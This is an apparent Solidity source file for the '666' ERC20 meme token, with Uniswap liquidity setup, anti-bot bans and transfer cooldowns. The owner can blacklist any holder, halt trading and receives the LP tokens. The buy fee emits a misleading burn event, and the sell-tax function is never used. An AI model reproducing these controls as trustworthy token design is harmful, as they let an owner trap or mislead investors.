// https://t.me/sixsixsixtokeneth
// https://www.666token.rocks/

pragma solidity ^0.8.7;

import "./ERC20.sol";
import "./IUniswapV2Router02.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract _666_ is ERC20 {
    address _owner;
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    bool public tradingEnable;
    mapping(address => bool) public isBot;
    mapping(address => bool) _isExcludedFromFee;
    mapping(address => uint256) _unblockTime;
    uint256 public blockSeconds = 666;
    uint256 _startTradingBlock;
    bool _inSwap;
    uint256 public maxBuy;

    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes
    uint256 constant maxByyIncrementPercentil = 1; // increment maxbyu percentil 1000=100%
    uint256 public maxBuyIncrementValue; // value for increment maxBuy
    uint256 public incrementTime; // last increment time

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor()
        ERC20("666", "666")
    {
        _owner = msg.sender;
        _isExcludedFromFee[address(0)] = true;
        _setMaxBuy(2);
    }

    receive() external payable {}

    function makeLiquidity() public onlyOwner {
        require(uniswapV2Pair == address(0));
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        _balances[address(this)] = _totalSupply;
        _allowances[address(this)][address(_uniswapV2Router)] = _totalSupply;
        _isExcludedFromFee[pair] = true;
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _totalSupply,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        uniswapV2Pair = pair;
        tradingEnable = true;

        incrementTime = block.timestamp;
        maxBuyIncrementValue = (_totalSupply * maxByyIncrementPercentil) / 1000;
        _startTradingBlock = block.number;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(!isBot[from] && !isBot[to]);

        // buy
        if (from == uniswapV2Pair && !_isExcludedFromFee[to]) {
            // increment maxBuy
            uint256 incrementCount = (block.timestamp - incrementTime) /
                (maxBuyIncrementMinutesTimer * 1 minutes);
            if (incrementCount > 0) {
                if (maxBuy < _totalSupply)
                    maxBuy += maxBuyIncrementValue * incrementCount;
                incrementTime = block.timestamp;
            }
            // trading enable
            require(tradingEnable);
            // antibot
            bool autoban = getAutoBanBots();
            if (!autoban) require(_balances[to] + amount <= maxBuy);
            if (autoban) isBot[to] = true;
            amount = _getFeeBuy(amount);
        }
        // sell
        else if (
            !_inSwap && uniswapV2Pair != address(0) && to == uniswapV2Pair
        ) {
            // block
            uint256 unblockTime = _unblockTime[from];
            require(block.timestamp >= unblockTime);
            _unblockTime[from] = block.timestamp + blockSeconds * 1 seconds;
        } else {
            // block
            uint256 unblockTime = _unblockTime[from];
            require(block.timestamp >= unblockTime);
            _unblockTime[from] = block.timestamp + blockSeconds * 1 seconds;
        }

        // transfer
        super._transfer(from, to, amount);
    }

    function getBlockedSeconds(address account) external view returns (uint256) {
        if (block.timestamp >= _unblockTime[account]) return 0;
        return (_unblockTime[account] - block.timestamp) / (1 seconds);
    }

    function _getFeeBuy(uint256 amount) private returns (uint256) {
        uint256 fee = amount / 10; // 10%
        amount -= fee;
        emit Transfer(address(this), address(0), fee);
        return amount;
    }

    function getSellDynamicBurnCount(uint256 amount)
        internal
        view
        returns (uint256)
    {
        // calculate fee percent
        uint256 value = _balances[uniswapV2Pair];
        uint256 vMax = (value * 6) / 100; // max additive tax amount (6%)
        if (amount > vMax) return amount / 5; // 20% tax

        // additive tax, that in intervat 0-20%
        return ((amount * amount) / vMax) / 5;
    }

    function _getFeeSell(uint256 amount, address account)
        private
        returns (uint256)
    {
        // get burn count
        uint256 burnCount = amount / 5; // 20% constant tax
        burnCount += getSellDynamicBurnCount(amount); // burn count

        amount -= burnCount;
        _balances[account] -= burnCount;
        _totalSupply -= burnCount;
        emit Transfer(address(this), address(0), burnCount);
        return amount;
    }

    function setMaxBuy(uint256 percent) external onlyOwner {
        _setMaxBuy(percent);
    }

    function _setMaxBuy(uint256 percentil) internal {
        maxBuy = (percentil * _totalSupply) / 1000;
    }

    function getMaxBuy() external view returns (uint256) {
        uint256 incrementCount = (block.timestamp - incrementTime) /
            (maxBuyIncrementMinutesTimer * 1 minutes);
        if (incrementCount == 0) return maxBuy;

        return maxBuy + maxBuyIncrementValue * incrementCount;
    }

    function setBots(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            isBot[accounts[i]] = value;
        }
    }

    function setExcludeFromFee(address[] memory accounts, bool value)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; ++i) {
            _isExcludedFromFee[accounts[i]] = value;
        }
    }

    function setTradingEnable(bool value) external onlyOwner {
        tradingEnable = value;
    }

    function getAutoBanBots() public view returns (bool) {
        return block.number < _startTradingBlock + 1;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        _owner = newOwner;
    }
}